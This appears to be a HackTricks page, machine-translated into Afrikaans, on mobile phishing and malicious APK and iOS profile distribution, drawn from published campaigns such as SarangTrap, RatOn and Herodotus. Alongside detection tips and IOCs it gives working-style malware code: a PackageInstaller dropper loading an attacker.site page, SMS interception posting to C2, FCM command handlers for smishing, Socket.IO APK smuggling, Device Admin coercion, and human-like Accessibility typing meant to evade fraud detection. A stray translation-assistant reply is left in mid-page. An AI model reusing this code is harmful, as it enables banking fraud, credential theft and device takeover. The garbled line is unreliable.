# Mobiele phishing & Kwaadwillige App-Verspreiding (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Hierdie bladsy dek tegnieke wat deur bedreigingsakters gebruik word om **malicious Android APKs** en **iOS mobile-configuration profiles** deur phishing (SEO, social engineering, fake stores, dating apps, ens.) te versprei.
> Die materiaal is aangepas vanaf die SarangTrap-veldtog wat deur Zimperium zLabs (2025) blootgelê is en ander openbare navorsing.

## Aanvalvloei

1. **SEO/Phishing Infrastructure**
* Registreer dosyne van look-alike domeine (dating, cloud share, car service…).
– Gebruik plaaslike taal sleutelwoorde en emojis in die `<title>` element om in Google te rangskik.
– Huisves beide Android (`.apk`) en iOS installasie-instruksies op dieselfde landingsblad.
2. **Eerste Fase Aflaai**
* Android: direkte skakel na 'n *unsigned* of “third-party store” APK.
* iOS: `itms-services://` of gewone HTTPS-skakel na 'n kwaadwillige **mobileconfig** profiel (sien hieronder).
3. **Post-installasie Sosiale Ingenieurswese**
* By die eerste uitvoering vra die app vir 'n **invitation / verification code** (illusie van eksklusiewe toegang).
* Die kode word **POSTed over HTTP** na die Command-and-Control (C2).
* C2 antwoord `{"success":true}` ➜ malware gaan voort.
* Sandbox / AV dinamiese analise wat nooit 'n geldige kode indien nie, sien **geen kwaadwillige gedrag** (evasion).
4. **Runtime Permission Abuse** (Android)
* Dangerous permissions word slegs gevra **na 'n positiewe C2-antwoord**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Onlangse variante **verwyder `<uses-permission>` vir SMS uit `AndroidManifest.xml`** maar laat die Java/Kotlin kodepad wat SMS deur reflection lees bestaan ⇒ verlaag die statiese score terwyl dit steeds funksioneel is op toestelle wat die toestemming via `AppOps` abuse of ou teikens toeken.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 het **Restricted settings** vir sideloaded apps gekonfronteer: Accessibility en Notification Listener-skakelaars is uitgegrys totdat die gebruiker eksplisiet restricted settings in **App info** toelaat.
* Phishing-bladsye en droppers lewer nou stap‑vir‑stap UI-instruksies om **restricted settings toe te laat** vir die sideloaded app en dan Accessibility/Notification toegang te aktiveer.
* 'n Nuweer omseiling is om die payload te installeer via 'n **session‑based PackageInstaller flow** (dieselfde metode wat app stores gebruik). Android hanteer die app as store‑installed, so Restricted settings blokkeer Accessibility nie meer nie.
* Triage-hint: in 'n dropper, grep vir `PackageInstaller.createSession/openSession` plus kode wat onmiddellik die slagoffer na `ACTION_ACCESSIBILITY_SETTINGS` of `ACTION_NOTIFICATION_LISTENER_SETTINGS` navigeer.

6. **Facade UI & Agtergrondversameling**
* App vertoon onslegtelike aansigte (SMS viewer, gallery picker) geïmplementeer lokaal.
* Intussen exfiltreer dit:
- IMEI / IMSI, telefoonnommer
- Volledige `ContactsContract` dump (JSON-array)
- JPEG/PNG vanaf `/sdcard/DCIM` gecomprimeer met [Luban](https://github.com/Curzibn/Luban) om grootte te verminder
- Opsionele SMS-inhoud (`content://sms`)
Payloads word **batch-zipped** en gestuur via `HTTP POST /upload.php`.
7. **iOS Afleweringstegniek**
* 'n Enkele **mobile-configuration profile** kan `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ens. versoek om die toestel te registreer in “MDM”-agtige toesig.
* Social-engineering instruksies:
1. Open Settings ➜ *Profile downloaded*.
2. Tik drie keer op *Install* (skermkiekies op die phishing-bladsy).
3. Trust the unsigned profile ➜ aanvaller verkry *Contacts* & *Photo* entitlement sonder App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads kan **pin 'n phishing URL to the Home Screen** met 'n gebrande ikoon/etiket.
* Web Clips kan **full‑screen** loop (verberg die browser UI) en as **non‑removable** gemerk word, wat die slagoffer dwing om die profiel te verwyder om die ikoon te verwyder.
9. **Netwerklaag**
* Plain HTTP, dikwels op poort 80 met HOST-kop soos `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (geen TLS → maklik om op te spoor nie).

## Red-Team Wenke

* **Dynamic Analysis Bypass** – Tydens malware-assessering, outomatiseer die invitation code‑fase met Frida/Objection om die kwaadwillige tak te bereik.
* **Manifest vs. Runtime Diff** – Vergelyk `aapt dump permissions` met runtime `PackageManager#getRequestedPermissions()`; ontbrekende gevaarlike perms is 'n rooi vlag.
* **Network Canary** – Konfigureer `iptables -p tcp --dport 80 -j NFQUEUE` om onsamehangende POST‑uitbarstings na kode‑invoer op te spoor.
* **mobileconfig Inspection** – Gebruik `security cms -D -i profile.mobileconfig` op macOS om `PayloadContent` te lys en oormatige entitlements op te spoor.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: outomatiese omseiling van uitnodigingskode</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Aanwysers (Generies)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Patroon

Hierdie patroon is waargeneem in veldtogte wat regeringsvoordeel-temas misbruik om Indiese UPI- geloofsbriewe en OTP's te steel. Operateurs ketting betroubare platforme vir aflewering en veerkragtigheid.

### Afleweringsketting oor betroubare platforme
- YouTube video lokmiddel → beskrywing bevat 'n kort skakel
- Kort skakel → GitHub Pages phishing site wat die regte portaal naboots
- Dieselfde GitHub repo huisves 'n APK met 'n valse “Google Play” badge wat direk na die lêer skakel
- Dynamiese phishing-bladsye leef op Replit; remote command channel gebruik Firebase Cloud Messaging (FCM)

### Dropper met ingeslote payload en offline installasie
- Die eerste APK is 'n installer (dropper) wat die werklike malware by `assets/app.apk` verskaf en die gebruiker daartoe aanmoedig om Wi‑Fi/mobiele data af te skakel om wolkontdekking te versag.
- Die ingeslote payload installeer onder 'n onskuldige etiket (bv., “Secure Update”). Na installasie is beide die installer en die payload teenwoordig as afsonderlike apps.

Statiese triage-wenk (grep vir ingeslote payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dinamiese endpoint-ontdekking via shortlink
- Malware haal 'n plain-text, komma-geskeide lys van lewende endpoints uit 'n shortlink; eenvoudige string-transformasies genereer die finale phishing-bladsypad.

Voorbeeld (gesanitiseer):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokode:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Die “Make payment of ₹1 / UPI‑Lite” stap laai 'n attacker HTML form vanaf die dinamiese endpoint binne 'n WebView en vang sensitiewe velde (phone, bank, UPI PIN) wat `POST`ed word na `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation en SMS/OTP onderskeping
- Agresiewe toestemmings word by die eerste uitvoering versoek:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakte word geloop om smishing SMS massaal te stuur vanaf die slagoffer se toestel.
- Inkomende SMS word deur 'n broadcast receiver onderskep en saam met metadata (sender, body, SIM slot, per-device random ID) na `/addsm.php` opgelaai.

Ontvanger-skets:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as 'n veerkragtige C2
- Die payload registreer by FCM; push-boodskappe dra 'n `_type`-veld wat as 'n skakelaar gebruik word om aksies te aktiveer (bv., update phishing text templates, skakel gedrag aan/af).

Voorbeeld FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler skets:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Aanwysers/IOCs
- APK bevat sekondêre payload by `assets/app.apk`
- WebView laai betaling vanaf `gate.htm` en exfiltrates na `/addup.php`
- SMS exfiltration na `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
- Apps gemerk as generiese “Update/Secure Update”
- FCM `data` messages met 'n `_type` discriminator in onbetroubare apps

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Aanvallers vervang toenemend statiese APK-skakels met 'n Socket.IO/WebSocket-kanaal wat ingebed is in Google Play–agtige lokvalle. Dit verberg die payload URL, omseil URL/extension filters, en behou 'n realistiese install UX.

Tipiese kliëntvloei wat in die veld waargeneem is:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Waarom dit eenvoudige kontroles omseil:
- Geen statiese APK-URL word blootgestel; die payload word in geheue uit WebSocket-frames herbou.
- URL/MIME/extension filters wat direkte .apk-responses blokkeer, kan binaire data wat via WebSockets/Socket.IO ge-tunnel is, misloop.
- Crawlers en URL-sandboxes wat nie WebSockets uitvoer nie, sal die payload nie terugkry nie.

Sien ook WebSocket tradecraft en tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn-gevalstudie

Die RatOn banker/RAT-campagne (ThreatFabric) is ’n konkrete voorbeeld van hoe moderne mobile phishing-operasies WebView droppers, Accessibility-gedrewe UI-automatisering, overlays/ransom, Device Admin-dwinging, Automated Transfer System (ATS), crypto wallet takeover, en selfs NFC-relay orchestration meng. Hierdie afdeling abstraheer die herbruikbare tegnieke.

### Stage-1: WebView → native install bridge (dropper)
Aanvallers wys ’n WebView wat na ’n attacker page wys en inject ’n JavaScript interface wat ’n native installer blootstel. ’n Tik op ’n HTML-knoppie roep native code aan wat ’n second-stage APK installeer wat in die dropper se assets ingebundel is en dit daarna direk lanseer.

Minimale patroon:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
I don't have the file content to translate. Please paste the markdown/HTML from src/generic-methodologies-and-resources/phishing-methodology/mobile-phishing-malicious-apps.md (including the tags/links/paths you want preserved), and I'll translate the English text to Afrikaans.
```html
<button onclick="bridge.installApk()">Install</button>
```
Na installasie begin die dropper die payload via eksplisiete pakket/aktiwiteit:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Opsporingsidee: onbetroubare apps wat `addJavascriptInterface()` aanroep en installer-agtige metodes aan WebView blootstel; APK wat 'n ingeslote sekondêre payload onder `assets/` bevat en die Package Installer Session API aanroep.

### Toestemming-proses: Accessibility + Device Admin + opvolg-runtime-aanmanings
Fase 2 open 'n WebView wat 'n “Access”-bladsy huisves. Die knoppie roep 'n geëksporteerde metode aan wat die slagoffer na die Accessibility-instellings navigeer en vra om die kwaadaardige diens te aktiveer. Sodra dit toegestaan is, gebruik malware Accessibility om later runtime-permissiedialoë (contacts, overlay, manage system settings, ens.) outomaties deur te klik en versoek Device Admin.

- Accessibility programmaties help om later prompts te aanvaar deur knoppies soos “Allow”/“OK” in die node-boom te vind en klikke te stuur.
- Overlay-permissie kontrole/aanvraag:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Sien ook:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operateurs kan opdragte uitreik om:
- toon 'n skermvullende overlay vanaf 'n URL, of
- stuur inline HTML wat in 'n WebView-overlay gelaai word.

Waarskynlike gebruike: dwang (PIN-invoer), wallet opening om PINs vas te vang, losprysboodskappe. Hou 'n opdrag gereed om te verseker dat overlay-toestemming toegestaan is indien dit ontbreek.

### Remote control model – teks pseudo-skerm + screen-cast
- Lae bandbreedte: periodies dump die Accessibility node tree, serialiseer sigbare tekste/rolle/bounds en stuur dit aan C2 as 'n pseudo-skerm (opdragte soos `txt_screen` eenmalig en `screen_live` kontinu).
- Hoë-fideliteit: versoek MediaProjection en begin screen-casting/recording op aanvraag (opdragte soos `display` / `record`).

### ATS-playbook (bank-app-automatisering)
Gegewe 'n JSON-taak, open die bank-app, bestuur die UI via Accessibility met 'n mengsel van teksnavrae en koördinaat-tappe, en voer die slagoffer se betalings-PIN in wanneer dit versoek word.

Voorbeeldtaak:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Voorbeeldtekste gesien in een teikenvloei (CZ → EN):
- "Nová platba" → "Nuwe betaling"
- "Zadat platbu" → "Voer betaling in"
- "Nový příjemce" → "Nuwe ontvanger"
- "Domácí číslo účtu" → "Inlandse rekeningnommer"
- "Další" → "Volgende"
- "Odeslat" → "Stuur"
- "Ano, pokračovat" → "Ja, gaan voort"
- "Zaplatit" → "Betaal"
- "Hotovo" → "Klaar"

Operateurs kan ook oordraglimiete kontroleer/verhoog via opdragte soos `check_limit` en `limit` wat op soortgelyke wyse deur die limiet-UI navigeer.

### Crypto wallet seed extraction
Teikens soos MetaMask, Trust Wallet, Blockchain.com, Phantom. Vloei: ontsluit (gestole PIN of gegewe wagwoord), navigeer na Security/Recovery, onthul/wys seed phrase, keylog/exfiltrate dit. Implementeer locale-aware selectors (EN/RU/CZ/SK) om navigasie oor verskeie tale te stabiliseer.

### Device Admin coercion
Device Admin APIs word gebruik om PIN-grypgeleenthede te verhoog en die slagoffer te frustreer:

- Onmiddellike vergrendeling:
```java
dpm.lockNow();
```
- Laat huidige credential verstryk om 'n verandering af te dwing (Accessibility vang nuwe PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Dwing nie-biometriese ontsluiting af deur keyguard-biometriese funksies uit te skakel:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Let wel: Baie DevicePolicyManager-beheer vereis Device Owner/Profile Owner op onlangse Android; sommige OEM-boues mag losweg wees. Valideer altyd op teiken OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 kan 'n eksterne NFC-relay-module installeer en begin (bv. NFSkate) en selfs 'n HTML-template daaraan deurgee om die slagoffer tydens die relay te lei. Dit stel contactless card-present cash-out langslynige ATS in staat.

Agtergrond: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operateur-opdragstel (voorbeeld)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Sosiaal: `send_push`, `Facebook`, `WhatsApp`
- Oorlêers: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Toestel: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Kommunikasie/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: mensagtige teksritme en dubbele teksinspuiting (Herodotus)

Dreigreakteurs meng toenemend Accessibility-gedrewe outomatisering met anti-detectie wat ingestel is teen basiese gedragsbiometrie. 'n Onlangse banker/RAT wys twee komplementêre teks-afleweringsmodusse en 'n operateurskakelaar om menslike tikgedrag met gerandomiseerde ritme te simuleer.

- Discovery-modus: enumereer sigbare nodes met selectors en bounds om insette presies te teiken (ID, text, contentDescription, hint, bounds) voor aksie.
- Dubbele teksinspuiting:
- Mode 1 – `ACTION_SET_TEXT` direk op die teikennode (stabiel, geen sleutelbord);
- Mode 2 – clipboard set + `ACTION_PASTE` in die gefokusde node (werk wanneer direkte setText geblokkeer is).
- Mensagtige ritme: verdeel die deur die operateur verskafde string en lewer dit karakter-vir-karakter met gerandomiseerde 300–3000 ms vertragings tussen gebeure om “machine-speed typing” heuristieke te ontduik. Geïmplementeer óf deur die waarde progressief te laat groei via `ACTION_SET_TEXT`, óf deur een karakter op 'n slag te plak.

<details>
<summary>Java-skets: node discovery + vertraagde per-karakter inset via setText of clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Blokkeer-overlaye vir bedrog-afskerming:
- Vertoon 'n volskerm `TYPE_ACCESSIBILITY_OVERLAY` met operateur-beheerde dekking; hou dit ondeursigtig vir die slagoffer terwyl afgeleë automatisering daaronder voortgaan.
- Tipies blootgestelde opdragte: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimale overlay met verstelbare alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator-beheerprimitiewe wat dikwels gesien word: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
